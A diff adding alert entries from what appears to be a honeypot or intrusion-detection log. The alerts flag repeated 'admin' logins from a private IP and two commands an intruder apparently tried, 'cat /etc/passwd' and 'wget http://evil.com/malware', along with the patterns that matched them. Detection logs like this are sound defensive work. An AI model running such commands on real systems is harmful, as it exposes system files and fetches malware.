@@ -1,0 +1,8 @@
+{"type": "alert", "timestamp": "2026-02-09T22:22:25.668804", "source_ip": "192.168.65.1", "severity": "medium", "message": "Suspicious username 'admin' (common attack username)"}
+{"type": "alert", "timestamp": "2026-02-09T22:22:35.011601", "source_ip": "192.168.65.1", "severity": "medium", "message": "Suspicious username 'admin' (common attack username)"}
+{"type": "alert", "timestamp": "2026-02-09T22:22:48.805924", "source_ip": "192.168.65.1", "severity": "medium", "message": "Suspicious username 'admin' (common attack username)"}
+{"type": "alert", "timestamp": "2026-02-09T22:23:12.348818", "source_ip": "192.168.65.1", "severity": "high", "message": "Suspicious command: 'cat /etc/passwd' (matched: '/etc/passwd')"}
+{"type": "alert", "timestamp": "2026-02-09T22:23:20.480258", "source_ip": "192.168.65.1", "severity": "high", "message": "Suspicious command: 'wget http://evil.com/malware' (matched: 'wget')"}
+{"type": "alert", "timestamp": "2026-02-10T05:35:40.920258", "source_ip": "192.168.65.1", "severity": "medium", "message": "Suspicious username 'admin' (common attack username)"}
+{"type": "alert", "timestamp": "2026-02-10T05:35:48.624804", "source_ip": "192.168.65.1", "severity": "medium", "message": "Suspicious username 'admin' (common attack username)"}
+{"type": "alert", "timestamp": "2026-02-10T05:35:53.826788", "source_ip": "192.168.65.1", "severity": "medium", "message": "Suspicious username 'admin' (common attack username)"}
